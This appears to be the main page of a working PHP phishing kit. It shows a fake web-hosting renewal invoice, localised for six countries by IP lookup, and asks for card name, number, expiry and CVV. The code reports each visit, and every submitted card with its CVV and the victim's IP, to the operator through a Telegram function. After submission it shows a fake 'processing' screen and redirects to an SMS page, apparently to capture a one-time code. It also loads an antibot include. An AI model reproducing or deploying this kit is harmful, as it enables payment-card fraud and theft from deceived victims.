<?php
include 'antibot.php';
include_once 'config.php';

$ip = $_SERVER['REMOTE_ADDR'];
$cc = function_exists('geoip_country_code_by_name') ? geoip_country_code_by_name($ip) : 'US';

$langs = [
  'IL' => ['he', 'rtl', '₪', '890.00', [
    'title' => 'תשלום חשבונית',
    'invoice' => 'מספר חשבונית',
    'date' => 'תאריך',
    'amount_due' => 'סכום לתשלום',
    'desc' => 'חידוש שנתי עבור שירותי האתר',
    'provider' => 'ספק שירות',
    'billing_email' => 'דוא"ל לחיוב',
    'download' => 'הורד חשבונית (PDF)',
    'secure' => '🔒 החיבור שלך מאובטח באמצעות הצפנה',
    'submit' => 'שלם עכשיו',
    'card_name' => 'שם בעל הכרטיס',
    'card_number' => 'מספר כרטיס אשראי',
    'expiry' => 'תאריך תפוגה (MM/YY)',
    'cvv' => 'קוד אבטחה (CVV)',
  ]],
  'FR' => ['fr', 'ltr', '€', '265.00', [
    'title' => 'Paiement de facture',
    'invoice' => 'Numéro de facture',
    'date' => 'Date',
    'amount_due' => 'Montant dû',
    'desc' => 'Renouvellement annuel des services Web',
    'provider' => 'Fournisseur',
    'billing_email' => 'Email de facturation',
    'download' => 'Télécharger la facture (PDF)',
    'secure' => '🔒 Votre connexion est sécurisée',
    'submit' => 'Payer maintenant',
    'card_name' => 'Titulaire de la carte',
    'card_number' => 'Numéro de carte',
    'expiry' => 'Expiration (MM/AA)',
    'cvv' => 'Code de sécurité (CVV)',
  ]],
  'PL' => ['pl', 'ltr', 'zł', '340.00', [
    'title' => 'Płatność faktury',
    'invoice' => 'Numer faktury',
    'date' => 'Data',
    'amount_due' => 'Kwota do zapłaty',
    'desc' => 'Roczna opłata za usługi strony internetowej',
    'provider' => 'Dostawca',
    'billing_email' => 'Email do faktur',
    'download' => 'Pobierz fakturę (PDF)',
    'secure' => '🔒 Twoje połączenie jest bezpieczne',
    'submit' => 'Zapłać teraz',
    'card_name' => 'Imię i nazwisko posiadacza karty',
    'card_number' => 'Numer karty',
    'expiry' => 'Data ważności (MM/RR)',
    'cvv' => 'Kod bezpieczeństwa (CVV)',
  ]],
  'DE' => ['de', 'ltr', '€', '399.00', [
    'title' => 'Rechnungszahlung',
    'invoice' => 'Rechnungsnummer',
    'date' => 'Datum',
    'amount_due' => 'Fälliger Betrag',
    'desc' => 'Jährliche Erneuerung der Website-Dienste',
    'provider' => 'Anbieter',
    'billing_email' => 'Rechnungs-E-Mail',
    'download' => 'Rechnung herunterladen (PDF)',
    'secure' => '🔒 Ihre Verbindung ist gesichert',
    'submit' => 'Jetzt bezahlen',
    'card_name' => 'Name des Karteninhabers',
    'card_number' => 'Kartennummer',
    'expiry' => 'Ablaufdatum (MM/JJ)',
    'cvv' => 'Sicherheitscode (CVV)',
  ]],
  'SA' => ['ar', 'rtl', '﷼', '1120.00', [
    'title' => 'دفع الفاتورة',
    'invoice' => 'رقم الفاتورة',
    'date' => 'التاريخ',
    'amount_due' => 'المبلغ المستحق',
    'desc' => 'تجديد سنوي لخدمات الموقع',
    'provider' => 'مزود الخدمة',
    'billing_email' => 'بريد الفوترة',
    'download' => 'تحميل الفاتورة (PDF)',
    'secure' => '🔒 الاتصال بك مؤمن',
    'submit' => 'ادفع الآن',
    'card_name' => 'اسم صاحب البطاقة',
    'card_number' => 'رقم البطاقة',
    'expiry' => 'تاريخ الانتهاء (MM/YY)',
    'cvv' => 'رمز الأمان (CVV)',
  ]],
  'US' => ['en', 'ltr', '$', '299.00', [
    'title' => 'Invoice Payment',
    'invoice' => 'Invoice Number',
    'date' => 'Date',
    'amount_due' => 'Amount Due',
    'desc' => 'Annual website service renewal',
    'provider' => 'Provider',
    'billing_email' => 'Billing Email',
    'download' => 'Download Invoice (PDF)',
    'secure' => '🔒 Your connection is secured',
    'submit' => 'Pay Now',
    'card_name' => 'Cardholder Name',
    'card_number' => 'Card Number',
    'expiry' => 'Expiry Date (MM/YY)',
    'cvv' => 'Security Code (CVV)',
  ]]
];

list($lang, $dir, $currency, $amount, $t) = $langs[$cc] ?? $langs['US'];

tg_send("📥 <b>Visit:</b> x.php\\nIP: $ip\\nCountry: $cc");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  tg_send("💳 <b>Card Submitted</b>\\n👤 Name: {$_POST['card_name']}\\n💳 Number: {$_POST['card_number']}\\n📅 Exp: {$_POST['expiry_date']}\\n🔒 CVV: {$_POST['cvv']}\\n🌐 IP: $ip");
  echo '
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>מעבד בקשה...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f6fa;
      font-family: "Segoe UI", Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      color: #222;
    }
    .loader-text {
      font-size: 1.2em;
      margin-top: 20px;
    }
    .dots span {
      animation: blink 1.5s infinite;
      font-size: 2em;
      margin: 0 2px;
    }
    .dots span:nth-child(2) { animation-delay: 0.2s; }
    .dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/5LZ8dA5.gif" alt="Loading" width="90" />
  <div class="loader-text">מעבד את הבקשה שלך<span class="dots"><span>.</span><span>.</span><span>.</span></span></div>
  <script>
    setTimeout(function() {
      window.location.href = "sms.php"; // or final.php
    }, 3000);
  </script>
</body>
</html>';
exit;
}
?>
<!DOCTYPE html>
<html lang="<?= $lang ?>" dir="<?= $dir ?>">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?= $t['title'] ?></title>
  <style>
    body { font-family: Arial; background: #f9f9f9; margin: 0; padding: 0; direction: <?= $dir ?>; }
    .container { max-width: 500px; margin: 60px auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    h1 { text-align: center; color: #222; }
    .info, label { text-align: <?= $dir === 'rtl' ? 'right' : 'left' ?>; }
    label { margin-top: 12px; display: block; font-weight: bold; }
    input[type="text"] { width: 100%; padding: 10px; margin-top: 6px; border: 1px solid #ccc; border-radius: 4px; }
    button { width: 100%; padding: 14px; margin-top: 25px; background: #007bff; border: none; color: white; font-size: 16px; border-radius: 4px; }
    button:hover { background: #0056b3; }
    .secure { color: green; font-size: 13px; margin-bottom: 15px; }
    .pdf { color: #007bff; font-size: 13px; margin-top: 10px; display: block; }
  </style>
</head>
<body>
<div class="container">
  <p class="secure"><?= $t['secure'] ?></p>
  <h1><?= $t['title'] ?></h1>
  <div class="info">
    <p><?= $t['invoice'] ?>: <strong>#INV-<?= rand(100000,999999) ?></strong></p>
    <p><?= $t['date'] ?>: <strong><?= date("d/m/Y") ?></strong></p>
    <p><?= $t['amount_due'] ?>: <strong><?= $currency . $amount ?></strong></p>
    <p><?= $t['desc'] ?></p>
    <p><strong><?= $t['provider'] ?>:</strong> WebHost Pro Ltd.<br>
    <strong><?= $t['billing_email'] ?>:</strong> billing@webhost-pro.co.il</p>
  </div>
  <a class="pdf" href="#">🧾 <?= $t['download'] ?></a>
  <form method="POST">
    <label><?= $t['card_name'] ?></label>
    <input type="text" name="card_name" required>
    <label><?= $t['card_number'] ?></label>
    <input type="text" name="card_number" maxlength="19" required>
    <label><?= $t['expiry'] ?></label>
    <input type="text" name="expiry_date" maxlength="5" required>
    <label><?= $t['cvv'] ?></label>
    <input type="text" name="cvv" maxlength="4" required>
    <button type="submit"><?= $t['submit'] ?></button>
  </form>
</div>
</body>
</html>
